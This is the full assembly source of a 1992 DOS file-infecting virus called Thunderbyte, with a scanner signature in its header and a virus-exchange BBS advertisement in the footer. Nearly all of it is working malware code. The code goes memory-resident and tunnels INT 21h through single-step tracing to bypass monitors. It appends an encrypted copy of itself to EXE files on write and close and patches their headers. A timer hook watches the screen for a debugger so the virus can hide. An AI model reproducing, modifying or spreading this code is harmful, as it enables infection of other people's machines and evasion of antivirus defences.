;*****************************************************************************;
;                                                                             ;
; Tunderbyte Virus                                                            ;
;                                                                             ;
; TBSCAN.DAT : DB3F00807609??4D75F9                                           ;
;                                                                             ;
;*****************************************************************************;

virus segment public 'code'
		assume	cs:virus, ds:virus, es:virus
		org	0

VirusStart	equ	$
VirusSize1	equ	(VirusEnd1-$)
VirusSize2	equ	(VirusEnd2-$)

Decrypt1:	db	0bdh,StartEncrypt-Decrypt2,0
		db	80h,76h,Decrypt2-VirusStart-1,0
		db	4dh,75h,-7
Decrypt2:	cli
		mov	sp,offset DoAgain-2
		ret	-8

		db	0,0,0,0,'***** THUNDERBYTE *****',0,0,0,0

Init:		mov	cx,(VirusEnd1-StartEncrypt+1)/2
		mov	dl,byte ptr cs:Decrypt1[6]
		mov	dh,dl
		mov	si,offset StartEncrypt
NotReady:	ret	2

DecryptWord:	mov	ax,ss:[si]
		xor	cs:[si],dx
NextWord:	add	dx,ax
		inc	si
		ret	-4

		dw	DecryptWord
		dw	DoAgain
		dw	NextWord
		dw	Init
DoAgain:	loop	NotReady

StartEncrypt	equ	$

Main:		mov	sp,1000h
		sti
		push	ds
		push	es
		mov	ax,03031h
		mov	bx,0DEADh
		int	21h
		cmp	ax,0DEADh
		jne	Install
		jmp	Exit
Install:	push	es
		mov	ah,52h
		int	21h
		mov	ax,es:[bx-2]
		mov	cs:FirstMCB,ax
		pop	es
CheckBlock:	mov	ds,ax
		inc	ax
		cmp	word ptr ds:[1],ax
		jne	NextBlock
		cmp	word ptr ds:[3],((VirusSize2+0fh)/10h)+((VirusSize1+0fh)/10h)
		jne	NextBlock
		push	ax
		push	es
		mov	cx,VirusSize2
		xor	di,di
		mov	es,ax
		mov	al,es:[di]
		cld
		repe	scasb
		pop	es
		pop	ax
		je	CopyVirus
NextBlock:	add	ax,ds:[3]
		cmp	byte ptr ds:[0],'Z'
		jne	CheckBlock
		mov	ah,4ah
		mov	bx,-1
		int	21h
		mov	ah,4ah
		sub	bx,((VirusSize2+0fh)/10h)+((VirusSize1+0fh)/10h)+1
		int	21h
		mov	ah,48h
		mov	bx,((VirusSize2+0fh)/10h)+((VirusSize1+0fh)/10h)
		int	21h
CopyVirus:	push	cs
		pop	ds
		dec	ax
		mov	es,ax
		inc	ax
		mov	es:[1],ax
		mov	cx,8
		mov	si,offset CommandStr
		mov	di,cx
		cld
		rep	movsb
		mov	es,ax
EncryptZero:	inc	byte ptr ds:Decrypt1[6]
		jz	EncryptZero
		mov	cx,VirusSize2
		xor	si,si
		xor	di,di
		cld
		rep	movsb
		push	es
		call	ReturnFar
		xor	ax,ax
		mov	ds,ax
		cli
		mov	ax,offset DebugWatch
		xchg	ax,ds:[20h]
		mov	cs:OldInt8o,ax
		mov	ax,cs
		xchg	ax,ds:[22h]
		mov	cs:OldInt8s,ax
		sti
		push	ds:[4]
		push	ds:[6]
		mov	word ptr ds:[4],offset Trace1
		mov	word ptr ds:[6],cs
		pushf
		push	cs
		mov	ax,offset Return4
		push	ax
		cli
		pushf
		pop	ax
		or	ax,100h
		push	ax
		push	ds:[86h]
		push	ds:[84h]
		mov	ah,52h
Trace1:		push	bp
		mov	bp,sp
		push	ax
		push	ds
		push	cs
		pop	ds
		mov	ax,FirstMCB
		cmp	[bp+4],ax
		jae	Return1
		mov	ax,[bp-2]
		mov	RegAX,ax
		mov	RegSP,bp
		mov	ax,[bp+2]
		mov	OldInt21o,ax
		mov	ax,[bp+4]
		mov	OldInt21s,ax
		xor	ax,ax
		mov	ds,ax
		mov	word ptr ds:[4],offset Trace2
		mov	word ptr ds:[6],cs
		jmp	short Trace3
Return1:	jmp	short Return3
Trace2:		push	bp
		mov	bp,sp
		push	ax
		push	ds
		cmp	ax,cs:RegAX
		jne	Return3
		cmp	bp,cs:RegSP
		jne	Return3
Trace3:		push	bx
		push	dx
		lds	bx,[bp+2]
		mov	al,[bx]
		mov	dx,[bx+1]
		inc	dx
		cmp	al,0e9h
		je	JumpOpcode
		cmp	al,0e8h
		je	CallOpcode
		xchg	ax,dx
		dec	ax
		cbw
		xchg	ax,dx
		cmp	al,0ebh
		je	JumpOpcode
		cmp	al,70h
		jb	Return2
		cmp	al,7fh
		ja	Return2
JumpOpcode:	push	ax
		push	ds
		xor	ax,ax
		mov	ds,ax
		mov	word ptr ds:[0c8h],offset HackJump
		mov	word ptr ds:[0cah],cs
		jmp	short Continue
CallOpcode:	push	ax
		push	ds
		xor	ax,ax
		mov	ds,ax
		mov	word ptr ds:[0c8h],offset HackCall
		mov	word ptr ds:[0cah],cs
Continue:	pop	ds
		pop	ax
		mov	cs:Displacement,dx
		mov	cs:Opcode,al
		mov	ax,32cdh
		xchg	ax,[bx]
		mov	cs:SavedCode,ax
		mov	cs:HackOffset,bx
		mov	cs:HackSegment,ds
		and	word ptr [bp+6],0feffh
Return2:	pop	dx
		pop	bx
Return3:	pop	ds
		pop	ax
		pop	bp
		iret
Return4:	pop	ds:[6]
		pop	ds:[4]
		mov	cs:Handle,0
Exit:		pop	es
		pop	ds
		mov	ax,ds
		add	ax,10h
		add	cs:OldCS,ax
		add	ax,cs:OldSP
		mov	dx,cs:OldSP
		cli
		mov	ss,ax
		mov	sp,dx
		sti
		jmp	cs:OldEntry

ReturnFar:	retf

OldEntry	equ	this dword
OldIP		dw	0
OldCS		dw	-10h
OldSP		dw	1000h
OldSS		dw	0

HackAddress	equ	this dword
HackOffset	dw	?
HackSegment	dw	?
SavedCode	dw	?

HackJump:	call	Interrupt21
		push	bp		; simulate a conditional or 
		push	ax		; unconditional jump
		mov	bp,sp
		mov	ax,[bp+8]
		and	ax,0fcffh
		push	ax
		db	0b8h		; mov ax,????
Displacement	dw	0
		popf
Opcode		db	0ebh,3,0	; j?? +3
		xor	ax,ax
		nop
		add	[bp+4],ax
		pop	ax
		pop	bp
		iret

HackCall:	call	Interrupt21
		sub	sp,2		; simulate a call
		push	bp
		mov	bp,sp
		push	ax
		mov	ax,[bp+4]
		inc	ax
		xchg	ax,[bp+8]
		xchg	ax,[bp+6]
		xchg	ax,[bp+4]
		add	ax,cs:Displacement
		mov	[bp+2],ax
		pop	ax
		pop	bp
		iret

Seek:		mov	ah,42h
		xor	cx,cx
		xor	dx,dx

Dos:		pushf
		db	9ah
OldInt21o	dw	?
OldInt21s	dw	?
		ret

DosVersion:	cmp	ax,3031h
		jne	NotTByte
		cmp	bx,0DEADh
		jne	NotTByte
		mov	ax,0DEADh
		add	sp,8
		iret

Interrupt21:	cmp	ah,30h
		je	DosVersion
		push	si
		push	ds
		push	cs:SavedCode
		lds	si,cs:HackAddress
		pop	ds:[si]
		pop	ds
		pop	si
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	bp
		push	ds
		push	es
		cmp	ah,3eh
		je	CloseFile
		cmp	ah,40h
		je	WriteFile
Old21:		pop	es
		pop	ds
		pop	bp
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		push	si
		push	ds
		lds	si,cs:HackAddress
		mov	word ptr ds:[si],32cdh
		pop	ds
		pop	si
NotTByte:	ret

WriteFile:	mov	ax,4400h
		call	Dos
		cmp	dl,7fh
		ja	Error1
		mov	al,1
		call	Seek
		jc	Error1
		or	dx,dx
		jnz	Error1
		cmp	ax,17h
		ja	Error1
		push	cs
		pop	es
		mov	si,dx
		mov	di,offset Signature
		add	di,ax
		cmp	word ptr [si],"ZM"
		jne	Error1
		cmp	word ptr [si+12h],0DEADh
		je	Error1
		cmp	cx,18h
		jb	CheckHandle
		or	ax,ax
		jz	Ok
CheckHandle:	cmp	bx,cs:Handle
		jne	Error1
Ok:		add	cx,ax
		cmp	cx,18h
		jbe	CountOk
		mov	cx,18h
CountOk:	sub	cx,ax
		jbe	Error1
		cld
		rep	movsb
		mov	cs:Handle,bx
Error1:		jmp	Old21

CloseFile:	push	cs
		pop	ds
		push	cs
		pop	es
		mov	ax,4400h
		call	Dos
		test	dl,80h
		jne	Error1
		or	bx,bx
		je	Read
		cmp	cs:Handle,bx
		je	DoNotRead
Read:		xor	al,al
		call	Seek
		jc	Error1
		mov	ah,3fh
		mov	cx,18h
		mov	dx,offset Signature
		call	Dos
		jc	Error1
DoNotRead:	mov	cs:Handle,0
		cmp	Signature,"ZM"
		jne	Error1
		cmp	ChkSum,0DEADh
		je	Error1
		mov	ax,ExeIP
		mov	OldIP,ax
		mov	ax,ExeCS
		mov	OldCS,ax
		mov	ax,ExeSS
		mov	OldSS,ax
		mov	ax,ExeSP
		mov	OldSP,ax
		mov	al,2
		call	Seek
		jc	Error1
		push	ax
		push	dx
		mov	cx,200h
		div	cx
		cmp	PartPage,dx
		jne	SizeError
		add	dx,-1
		adc	ax,0
		cmp	PageCount,ax
SizeError:	pop	dx
		pop	ax
		jne	Error2
		add	ax,0fh
		adc	dx,0
		and	ax,0fff0h
		mov	cx,dx
		mov	dx,ax
		mov	ax,4200h
		call	Dos
		jnc	SeekOk
Error2:		jmp	Old21
SeekOk:		mov	cx,10h
		div	cx
		sub	ax,HdrSize
		mov	ExeCS,ax
		mov	ExeIP,offset Decrypt1
		mov	ExeSS,ax
		mov	ExeSP,VirusSize1+400h
		cmp	MinMem,40h
		jae	MemoryOk
		mov	MinMem,40h
		cmp	MaxMem,40h
		jae	MemoryOk
		mov	MaxMem,40h
MemoryOk:	push	ds
		push	es
		mov	ax,cs
		mov	ds,ax
		add	ax,(VirusSize2+0fh)/10h
		mov	es,ax
		mov	cx,VirusSize1
		xor	si,si
		xor	di,di
		cld
		rep	movsb
		mov	ds,ax
		mov	cx,offset StartEncrypt-Decrypt2
		mov	dl,byte ptr ds:Decrypt1[6]
		mov	si,offset StartEncrypt-1
Again1:		xor	ds:[si],dl
		dec	si
		loop	Again1
		mov	cx,(VirusEnd1-StartEncrypt+1)/2
		mov	dh,dl
		mov	si,offset StartEncrypt
Again2:		xor	ds:[si],dx
		mov	ax,ds:[si]
		add	dx,ax
		inc	si
		add	dx,ax
		inc	si
		loop	Again2
		mov	ah,40h
		mov	cx,VirusSize1
		xor	dx,dx
		call	Dos
		pop	ds
		pop	es
		jc	Error3
		mov	al,2
		call	Seek
		jc	Error3
		mov	cx,200h
		div	cx
		mov	PartPage,dx
		add	dx,-1
		adc	ax,0
		mov	PageCount,ax
		mov	ChkSum,0DEADh
		xor	al,al
		call	Seek
		jc	Error3
		mov	ah,40h
		mov	cx,18h
		mov	dx,offset Signature
		call	Dos
Error3:		jmp	Old21

Count		dw	8
DebugStr	db	'DEBUG'
CommandStr	db	'COMMAND '

DebugWatch:	push	ax
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es
		dec	cs:Count
		jnz	EndWatch
		mov	cs:Count,8
		mov	ax,0b000h
		mov	ds,ax
		mov	cx,2
		push	cs
		pop	es
		cld
NextScreen:	push	cx
		mov	cx,2000
		xor	si,si
		mov	di,offset DebugStr
NextChar1:	mov	dx,5
NextChar2:	lodsb
		inc	si
		and	al,0dfh
		scasb
		jne	CharOk
		dec	dx
		jnz	NextChar2
Alarm:		pop	cx
		lds	si,cs:HackAddress
		cmp	byte ptr ds:[si],0cdh
		jne	EndWatch
		mov	ax,cs:SavedCode
		mov	ds:[si],ax
		xor	cx,cx
		mov	ds,cx
		mov	ax,cs:OldInt8o
		mov	ds:[20h],ax
		mov	ax,cs:OldInt8s
		mov	ds:[22h],ax
		mov	es,cx
		push	cs
		pop	ds
		mov	cx,14
		mov	si,offset EndWatch-2
		mov	di,4f0h
		push	es
		push	di
		rep	movsb
		xor	di,di
		mov	cx,VirusSize2
		push	cs
		pop	es
		retf
CharOk:		neg	dx
		add	dx,5
		sbb	di,dx
		sub	si,dx
		sub	si,dx
		loop	NextChar1
ScreenOk:	mov	ax,ds
		add	ax,800h
		mov	ds,ax
		pop	cx
		loop	NextScreen
		jmp	short EndWatch
		rep	stosb
EndWatch:	pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	ax
		db	0eah
OldInt8o	dw	?
OldInt8s	dw	?

		db	'***** (C) COPYRIGHT 1992 BY THE WRITER *****'

VirusEnd1	equ	$

FirstMCB	dw	?
RegAX		dw	?
RegSP		dw	?

Handle		dw	?
Signature	dw	?
PartPage	dw	?
PageCount	dw	?
ReloCnt		dw	?
HdrSize		dw	?
MinMem		dw	?
MaxMem		dw	?
ExeSS		dw	?
ExeSP		dw	?
ChkSum		dw	?
ExeIP		dw	?
ExeCS		dw	?

VirusEnd2	equ	$

virus ends

end Main

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;
;컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴컴;
;컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;

